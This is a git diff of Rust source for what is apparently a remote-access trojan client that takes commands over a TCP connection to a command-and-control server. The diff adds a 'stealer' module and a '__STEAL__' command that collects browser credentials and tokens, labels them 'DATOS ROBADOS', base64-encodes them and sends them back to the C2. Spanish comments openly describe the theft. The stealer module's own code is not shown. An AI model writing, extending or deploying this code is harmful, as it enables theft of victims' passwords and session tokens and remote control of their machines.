@@ -1,6 +1,7 @@
 #![windows_subsystem = "console"]
 
 mod config;
+mod stealer;
 
 use std::io::{BufRead, BufReader, Write};
 use std::net::TcpStream;
@@ -60,6 +61,12 @@ fn handle_connection(stream: TcpStream) {
                     // Formato: __UPLOAD__|ruta_destino|datos_base64
                     println!("DEBUG: Procesando upload...");
                     let response = upload_file(command);
+                    writer.write_all(response.as_bytes()).ok();
+                    writer.flush().ok();
+                } else if command == "__STEAL__" {
+                    // Comando para robar credenciales de browsers
+                    println!("DEBUG: Robando credenciales de browsers...");
+                    let response = steal_browser_credentials();
                     writer.write_all(response.as_bytes()).ok();
                     writer.flush().ok();
                 } else if !command.is_empty() {
@@ -244,4 +251,21 @@ fn base64_decode(data: &str) -> Result<Vec<u8>, String> {
     }
     
     Ok(result)
+}
+
+/// Roba credenciales de browsers y las formatea para enviar al C2
+fn steal_browser_credentials() -> String {
+    let stolen_data = stealer::steal_all();
+    
+    if stolen_data.is_empty() {
+        return format!("__ERROR__:No se encontraron credenciales ni tokens{}", DELIMITER);
+    }
+    
+    let mut output = String::from("═══ DATOS ROBADOS ═══\n");
+    output.push_str(&format!("Total: {} items encontrados\n", stolen_data.total_count()));
+    output.push_str(&stolen_data.to_string());
+    
+    // Codificar en Base64 para transmisión segura
+    let encoded = stealer::common::base64_encode(output.as_bytes());
+    format!("__CREDENTIALS_B64__:{}{}", encoded, DELIMITER)
 }
